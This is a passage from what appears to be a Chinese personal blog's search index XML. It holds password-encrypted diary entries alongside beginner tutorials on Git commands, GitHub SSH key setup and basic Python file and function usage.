    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>小型组</category>
      </categories>
      <tags>
        <tag>小型组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心路历程]]></title>
    <url>%2F%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[请输入访问密匙（提示：一个备注名） Decrypt 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]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[就想记录下这一天]]></title>
    <url>%2F%E5%B0%B1%E6%83%B3%E8%AE%B0%E5%BD%95%E4%B8%8B%E8%BF%99%E4%B8%80%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt 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]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 提升之路]]></title>
    <url>%2FGit-%E6%8F%90%E5%8D%87%E4%B9%8B%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[安装什么的简单的就不说了，基本操作了~ 基本的 Git 工作流程如下： 在工作目录中修改某些文件。 对修改后的文件进行快照，然后保存到暂存区域。 提交更新，将保存在暂存区域的文件快照永久转储到 Git 目录中。 Git基本命令： Git具体命令（初识下）mkdir python（创建文件夹test） cd python（切换到test目录） touch ex1.py（新建a.md文件） Git init (初始化Git仓库) Git status（查看状态，这个命令可以算是使用最频繁的一个命令了，没事就输入下这个命令，来查看你当前 git 仓库的一些状态）图片如下： 默认就直接在 master 分支，关于分支的概念后面会提，这时最主要的是提示 ex1.py 文件 Untracked files ，就是说 ex1.py 这个文件还没有被跟踪，还没有提交在 git 仓库里呢，而且提示你可以使用 git add 去操作你想要提交的文件。 Git add（提交到Git仓库里面）此时提示以下文件 Changes to be committed ， 意思就是 ex1.py 文件等待被提交，当然可以使用 git rm –cached 这个命令去移除这个缓存。 Git commit（接着输入 git commit -m ‘first commit’ ，commit 是提交的意思，- m 代表是提交信息，执行了以上命令代表我们已经正式进行了第一次提交。这个时候再输入 git status ，会提示 nothing to commit。） Git log（git log 命令可以查看所有产生的 commit 记录，所以可以看到已经产生了一条 commit 记录，而提交时候的附带信息叫 ‘first commit’ 。） Git branch（branch 即分支的意思） 分支的概念很重要，尤其是团队协作的时候，假设两个人都在做同一个项目，这个时候分支就是保证两人能协同合作的最大利器了。 举个例子，A, B俩人都在做同一个项目，但是不同的模块，这个时候A新建了一个分支叫a， B新建了一个分支叫b，这样A、B做的所有代码改动都各自在各自的分支，互不影响，等到俩人都把各自的模块都做完了，最后再统一把分支合并起来。 执行 git init 初始化git仓库之后会默认生成一个主分支 master ，也是你所在的默认分支，也基本是实际开发正式环境下的分支，一般情况下 master 分支不会轻易直接在上面操作的 如果我们想在此基础上新建一个分支呢，很简单，执行 git branch a 就新建了一个名字叫 a 的分支，这时候分支 a 跟分支 master 是一模一样的容，我们再输入 git branch 查看的当前分支情况： 但是可以看到 master 分支前有个 * 号，即虽然新建了一个 a 的分支，但是当前所在的分支还是在 master 上，如果我们想在 a 分支上进行开发，首先要先切换到 a 分支上才行，所以下一步要切换分支git checkout python1 快捷操作方式git checkout -b python2（这个命令的意思就是新建一个python2分支，并且自动切换到python2分支。） git merge（合并分支）需要先做两步，第一步是切换到 master 分支，如果你已经在了就不用切换了，第二步执行 git merge python1 ，意思就是把 python1 分支的代码合并过来，不出意外，这个时候a分支的代码就顺利合并到 master 分支来了。意外的情况就是发生了冲突，不方便合并！ git branch -d（删除分支） git branch -D（强制删除分支，原因是该分支没有和master分支进行合并） Git tag（添加标签/版本号的意思） 新建一个标签很简单，比如 git tag v1.0 就代表我在当前代码状态下新建了一个v1.0的标签，输入 git tag 可以查看历史 tag 记录。 想要切换到某个 tag 怎么办？也很简单，执行 git checkout v1.0 ，这样就顺利的切换到 v1.0 tag的代码状态了。 SSH防坑1. SSH简介简单点说，SSH是一种网络协议，用于计算机之间的加密登录。目前是每一台 Linux 电脑的标准配置。而大多数 Git 服务器都会选择使用 SSH 公钥来进行授权，所以想要在 GitHub 提交代码的第一步就是要先添加 SSH key 配置。 生成SSH keyLinux 与 Mac 都是默认安装了 SSH ，而 Windows 系统安装了 Git Bash 应该也是带了 SSH的。大家可以在终端（win下在 Git Bash 里）输入 ssh 如果出现以下提示证明你本机已经安装 SSH。 ssh-keygen -t rsa 就是指定 rsa 算法生成密钥，接着连续三个回车键（不需要输入密码），然后就会生成两个文件 id_rsa 和 id_rsa.pub ，而 id_rsa 是密钥,id_rsa.pub 就是公钥。 PS：输入密码的话要做好备份，防止密码遗忘~如果密码忘记就要删除重建了！ 3. GitHub 上添加 SSH key在 GitHub 上的设置页面，点击最左侧 SSH and GPG keys ,然后点击右上角的 New SSH key 按钮,在 Key 那栏把 id_rsa.pub(使用 EditPlus 或者 Sublime 等打开复制就行了) 公钥文件里的内容复制粘贴进去就可以了，Title 那栏不需要填写，点击 Add SSH key 按钮就ok了。 SSH key 添加成功之后，输入 ssh -T git@github.com 进行测试，如果出现以下提示证明添加成功了。 错误一： 改了密钥的存放位置，此时，你需要分别执行下面两条命令： ssh-agent bashssh-add 这里填写你密钥的存放位置如果你给公钥设置了密码，那么执行 ssh-add xxx 之后会提示你输入密码。 错误二：宿主的 GITHUB.com（52.74.223.119）的真实性是无法成立的。RSA密钥指纹是Sa256:NTBG6KXUPJWGL7E1IGOCSFPROXTXDCARLVIKW6E5SY8。 重新生成了密匙，选择yes，然后显示]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 入门篇]]></title>
    <url>%2Fpython-%E5%85%A5%E9%97%A8%E7%AF%87%2F</url>
    <content type="text"><![CDATA[变量 nonlocal：指定上一级变量，如果没有就继续往上直到找到为止 Python title() 方法返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())。 文件打开和关闭文件 raw_input([prompt]) 函数从标准输入读取一个行，并返回一个字符串（去掉结尾的换行符）： input([prompt]) 函数和 raw_input([prompt]) 函数基本类似，但是 input 可以接收一个Python表达式作为输入，并将运算结果返回。 打开和关闭文件file object = open(file_name [, access_mode][, buffering])fileObject.close() File对象的属性file.closed 返回true如果文件已被关闭，否则返回false。file.mode 返回被打开文件的访问模式。file.name 返回文件的名称。file.softspace 如果用print输出后，必须跟一个空格符，则返回false。否则返回true。 权限 write()方法fileObject.write(string)write()方法可将任何字符串写入一个打开的文件。write()方法不会在字符串的结尾添加换行符(‘\n’)： read（）方法read（）方法从一个打开的文件中读取一个字符串。需要重点注意的是，Python字符串可以是二进制数据，而不是仅仅是文字。fileObject.read([count]) 文件定位 tell()方法告诉你文件内的当前位置, 换句话说，下一次的读写会发生在文件开头这么多字节之后。 seek（offset [,from]）方法改变当前文件的位置。Offset变量表示要移动的字节数。From变量指定开始移动字节的参考位置。 重命名和删除文件 rename()方法：rename()方法需要两个参数，当前的文件名和新文件名。os.rename(current_file_name, new_file_name) remove()方法你可以用remove()方法删除文件，需要提供要删除的文件名作为参数。os.remove(file_name) Python里的目录 mkdir()方法可以使用os模块的mkdir()方法在当前目录下创建新的目录们。你需要提供一个包含了要创建的目录名称的参数。os.mkdir(“newdir”) chdir()方法可以用chdir()方法来改变当前的目录。chdir()方法需要的一个参数是你想设成当前目录的目录名称。os.chdir(“newdir”) getcwd()方法getcwd()方法显示当前的工作目录。os.getcwd()-rmdir()方法rmdir()方法删除目录，目录名称以参数传递。在删除这个目录之前，它的所有内容应该先被清除。os.rmdir(‘dirname’) 函数### 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号()。 函数内容以冒号起始，并且缩进。 return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。 匿名函数python 使用 lambda 来创建匿名函数。lambda 只是一个表达式，函数体比def简单很多。lambda 的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。lambda 函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。虽然lambda 函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。 参数以下是调用函数时可使用的正式参数类型：必备参数关键字参数默认参数不定长参数 Django安装 教程]]></content>
      <categories>
        <category>python 入门</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次思考]]></title>
